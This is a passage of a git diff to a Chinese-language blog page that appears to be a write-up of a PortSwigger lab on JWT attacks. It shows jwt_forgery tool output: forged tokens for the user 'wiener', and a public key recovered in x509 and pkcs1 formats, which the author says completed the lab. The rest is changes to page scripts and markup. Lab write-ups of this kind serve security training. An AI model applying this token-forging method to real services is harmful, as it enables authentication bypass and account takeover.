class="string">&#x27;eyJraWQiOiIzZjRhZjRiMS1mY2M1LTQwZjUtODM4My02NGRmZjI3NGE0NDUiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiAicG9ydHN3aWdnZXIiLCAic3ViIjogIndpZW5lciIsICJleHAiOiAxNjkxMjI0NjQ3fQ.F0iHCARSbO2x5TXcMaPb8BgWa-V6oTwZcTbfAFHSaEA&#x27;</span></span><br><span class="line">================================================================================</span><br><span class="line">Here are your JWT<span class="string">&#x27;s once again for your copypasting pleasure</span></span><br><span class="line"><span class="string">================================================================================</span></span><br><span class="line"><span class="string">eyJraWQiOiIzZjRhZjRiMS1mY2M1LTQwZjUtODM4My02NGRmZjI3NGE0NDUiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiAicG9ydHN3aWdnZXIiLCAic3ViIjogIndpZW5lciIsICJleHAiOiAxNjkxMjI0NjQ3fQ.AYG4nDBhtzoWcU685taZmRQqML7GaZrFtLzgMOBTjiE</span></span><br><span class="line"><span class="string">eyJraWQiOiIzZjRhZjRiMS1mY2M1LTQwZjUtODM4My02NGRmZjI3NGE0NDUiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiAicG9ydHN3aWdnZXIiLCAic3ViIjogIndpZW5lciIsICJleHAiOiAxNjkxMjI0NjQ3fQ.F0iHCARSbO2x5TXcMaPb8BgWa-V6oTwZcTbfAFHSaEA</span></span><br><span class="line"><span class="string">root@ecdfab3005f4:/app# dir</span></span><br><span class="line"><span class="string">9eabc94b42906dfb_65537_pkcs1.pem  Dockerfile  jwt_forgery.py  requirements.txt</span></span><br><span class="line"><span class="string">9eabc94b42906dfb_65537_x509.pem   README.md   pkcs1.asn       x509.asn</span></span><br><span class="line"><span class="string">root@ecdfab3005f4:/app# cat 9eabc94b42906dfb_65537_x509.pem</span></span><br><span class="line"><span class="string">-----BEGIN PUBLIC KEY-----</span></span><br><span class="line"><span class="string">MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAnqvJS0KQbfvVO4yO0HWZ</span></span><br><span class="line"><span class="string">EJBjjJIhS4X1Np2guAk1mmDrEgBL1CXo914anEPdB3DvSI09jq8IYg3Zs3Zqwxs2</span></span><br><span class="line"><span class="string">mHhECGwUwtzxyKuR9UUKsgERAHjPIscNjb4lvQlalH40MHSQkFRwtPlWRUj7j8DD</span></span><br><span class="line"><span class="string">MgAsNX6BU36Xp6EFPoGeqip7d4hbieyRJu1OPHx2H2MrGVs/qp4M44Hx7lMC9wIL</span></span><br><span class="line"><span class="string">URVZN1VJd/x31tEbJ9X10/jVxm2qSkhQ8Za6xCFfk871XRsoYW+C7R8nsWuU0Oh/</span></span><br><span class="line"><span class="string">qfYw0pGpfx6fIu2iguJ89xpuVzgT69pD5O16xjXdBHUEGIFiN+Q7Ncg/ZJjzOF4P</span></span><br><span class="line"><span class="string">mQIDAQAB</span></span><br><span class="line"><span class="string">-----END PUBLIC KEY-----</span></span><br><span class="line"><span class="string">root@ecdfab3005f4:/app# cat 9eabc94b42906dfb_65537_pkcs1.pem</span></span><br><span class="line"><span class="string">-----BEGIN RSA PUBLIC KEY-----</span></span><br><span class="line"><span class="string">MIIBCgKCAQEAnqvJS0KQbfvVO4yO0HWZEJBjjJIhS4X1Np2guAk1mmDrEgBL1CXo</span></span><br><span class="line"><span class="string">914anEPdB3DvSI09jq8IYg3Zs3Zqwxs2mHhECGwUwtzxyKuR9UUKsgERAHjPIscN</span></span><br><span class="line"><span class="string">jb4lvQlalH40MHSQkFRwtPlWRUj7j8DDMgAsNX6BU36Xp6EFPoGeqip7d4hbieyR</span></span><br><span class="line"><span class="string">Ju1OPHx2H2MrGVs/qp4M44Hx7lMC9wILURVZN1VJd/x31tEbJ9X10/jVxm2qSkhQ</span></span><br><span class="line"><span class="string">8Za6xCFfk871XRsoYW+C7R8nsWuU0Oh/qfYw0pGpfx6fIu2iguJ89xpuVzgT69pD</span></span><br><span class="line"><span class="string">5O16xjXdBHUEGIFiN+Q7Ncg/ZJjzOF4PmQIDAQAB</span></span><br><span class="line"><span class="string">-----END RSA PUBLIC KEY-----</span></span><br></pre></td></tr></table></figure>
+
+<p>可以看出jwt_forger已经把公钥分为两个格式存入文件了，分别使用两个形式的公钥进行尝试就可以了。最后使用x509格式的公钥成功完成了实验。</p>
+<p><a href="/../img/JWT-attacks/8-1.png" title="8-1" class="gallery-item" style="box-shadow: none;"> <img src="/../img/JWT-attacks/8-1.png" alt="8-1"></a></p>
+</div><script src="https://jsd.onmicrosoft.cn/npm/hexo-theme-a4@latest/source/js/lightgallery.min.js"></script><script>if("undefined"!=typeof lightGallery) {
+        var options1 = {
+            selector: '.gallery-item'
+        };
+        lightGallery(document.getElementsByClassName('.article-gallery')[0], options1);
+        }</script>
     </div>
 
     <div class="post-meta">
@@ -467,6 +597,13 @@ Ju1OPHx2H2MrGVs/qp4M44Hx7lMC9wILURVZN1VJd/x31tEbJ9X10/jVxm2qSkhQ
         
         </i>
     </div>
+    <br>
+    
+    <!-- <div class="post-footer-pre-next">
+        <span>上一篇：<a href=""></a></span>
+        <span class="post-footer-pre-next-last-span-right">上一篇：<a href=""></a></span>
+    </div> -->
+
     
         
 
@@ -499,26 +636,8 @@ Ju1OPHx2H2MrGVs/qp4M44Hx7lMC9wILURVZN1VJd/x31tEbJ9X10/jVxm2qSkhQ
 </div>
 
 
-   
     
-<script src="/js/highlight.min.js"></script>
-
-    
-<script src="/js/highlightjs-line-numbers.js"></script>
-
-
-    
-<script src="/js/randomHeaderContent.js"></script>
-
-    <!--回到顶部按钮-->
-    
-        
 <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.4.0/jquery.min.js"></script>
-
-        
-<script src="/js/returnToTop.js"></script>
-
-    
 
     <!--目录-->
     
@@ -530,12 +649,27 @@ Ju1OPHx2H2MrGVs/qp4M44Hx7lMC9wILURVZN1VJd/x31tEbJ9X10/jVxm2qSkhQ
 
     
 
+    
+<script src="/js/randomHeaderContent.js"></script>
+
+    <!--回到顶部按钮-->
+    
+        
+<script src="/js/returnToTop.js"></script>
+
+    
+
+    
+        
+<script src="/js/returnToLastPage.js"></script>
+
+    
 
 
-<script>
-    hljs.initHighlightingOnLoad();
-    hljs.initLineNumbersOnLoad();
-</script>
+
+
+
+<script src="/js/lightgallery.min.js"></script>
 
 
 
@@ -549,7 +683,13 @@ Ju1OPHx2H2MrGVs/qp4M44Hx7lMC9wILURVZN1VJd/x31tEbJ9X10/jVxm2qSkhQ
                     </svg>
                 </div>
             
+            
+                <!-- 返回的按钮-->  
+                <div class="return-to-last-progress-wrap shadow-drop-2-bottom">
+                    <svg class="progress-circle svg-content" width="100%" height="100%" viewBox="-1 -1 102 102">
+                        <path d="M50,1 a49,49 0 0,1 0,98 a49,49 0 0,1 0,-98"/>
+                    </svg>
+                </div>
+            
     </body>
-
-
 </html>
